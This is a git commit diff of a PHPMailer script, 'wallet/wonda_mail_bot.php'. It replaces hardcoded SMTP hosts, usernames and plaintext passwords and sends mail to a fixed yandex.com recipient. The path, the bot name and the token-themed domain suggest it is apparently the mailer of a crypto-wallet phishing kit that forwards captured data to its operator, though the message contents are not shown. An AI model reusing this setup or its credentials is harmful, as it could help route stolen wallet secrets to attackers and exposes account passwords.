da5254724019ac7d7d74424c0c1bdce21645e239
zeddstech <39128666+zeddstech@users.noreply.github.com>
2022-04-27 09:58:26 -0500

    Update wonda_mail_bot.php

--- wallet/wonda_mail_bot.php
+++ wallet/wonda_mail_bot.php
@@ -22,15 +22,15 @@ try {
     //Server settings
     $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
     $mail->isSMTP();                                            //Send using SMTP
-    $mail->Host       = 'server110.web-hosting.com';                     //Set the SMTP server to send through
+    $mail->Host       = 'lavender.hostnownow.com';                     //Set the SMTP server to send through
     $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
-    $mail->Username   = 'webmaster@app.telcointoken10x.live';                     //SMTP username
-    $mail->Password   = 'IF~Ny-e[U9lA';                               //SMTP password
+    $mail->Username   = 'webmaster@testflora.xyz';                     //SMTP username
+    $mail->Password   = '%3BQVc1-~fy8';                               //SMTP password
     $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
     $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
 
     //Recipients
-    $mail->setFrom('webmaster@app.telcointoken10x.live', 'Webmaster');
+    $mail->setFrom('webmaster@testflora.xyz', 'Webmaster');
     $mail->addAddress('JosephRHopkins@yandex.com', 'Joseph R Hopkins');     //Add a recipient
 
 
